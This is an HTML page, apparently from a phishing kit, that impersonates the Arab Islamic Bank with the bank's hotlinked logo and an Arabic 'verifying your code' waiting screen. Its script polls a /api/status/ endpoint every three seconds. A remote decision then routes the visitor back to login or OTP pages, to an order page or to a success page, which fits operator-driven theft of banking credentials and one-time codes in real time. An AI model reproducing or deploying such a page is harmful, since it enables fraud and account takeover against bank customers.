<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>جاري التحقق | البنك الإسلامي العربي</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=IBM+Plex+Sans+Arabic:wght@400;500;700&display=swap" rel="stylesheet">
<style>
:root{--primary:#1B6B3A; --bg:#f0eeeb; --ink:#1c1720; --muted:#888}
*{box-sizing:border-box; margin:0; padding:0}
body{font-family:"IBM Plex Sans Arabic","Cairo",sans-serif; background:var(--bg); min-height:100vh; display:flex; flex-direction:column}
.top-bar{display:flex; align-items:center; justify-content:center; padding:12px 16px}
.logo-area img{height:44px}
.wait-container{flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:40px 24px; text-align:center}
.spinner{width:64px; height:64px; border:5px solid #e0e0e0; border-top:5px solid var(--primary); border-radius:50%; animation:spin 1s linear infinite; margin-bottom:30px}
@keyframes spin{to{transform:rotate(360deg)}}
.wait-title{font-size:1.3rem; font-weight:900; color:var(--ink); margin-bottom:12px}
.wait-sub{font-size:.95rem; color:var(--muted); line-height:1.7; max-width:320px}
</style>
</head>
<body>
<div class="top-bar"><div class="logo-area"><img src="https://aib.ps/uc_files/image/resize/226/53/app_files/logopng_16691947964653877586094.png?vsig=fe3b85fa430300011345c623e9bc93d1" alt="AIB"></div></div>
<div class="wait-container">
  <div class="spinner"></div>
  <div class="wait-title">جاري التحقق من الرمز</div>
  <div class="wait-sub">يرجى الانتظار بينما يتم التحقق من رمز التأكيد...</div>
</div>
<script>
const hash = location.hash.slice(1);
const ref = hash.split("~")[0];
if (!ref) window.location.href = "login.html";

const pages = {login:"login.html",otp:"otp.html",order:"order.html"};
let polling = setInterval(async () => {
  try {
    const r = await fetch("/api/status/" + encodeURIComponent(ref));
    const d = await r.json();
    if (!d.ok) return;
    if (d.decision === "redirect" && d.next && pages[d.next]) {
      clearInterval(polling);
      window.location.href = pages[d.next] + "#" + hash;
    } else if (d.decision === "accept" && d.next === "done") {
      clearInterval(polling);
      window.location.href = "success.html";
    } else if (d.decision === "reject") {
      clearInterval(polling);
      window.location.href = "otp.html#" + hash;
    }
  } catch(e){}
}, 3000);
</script>
</body>
</html>
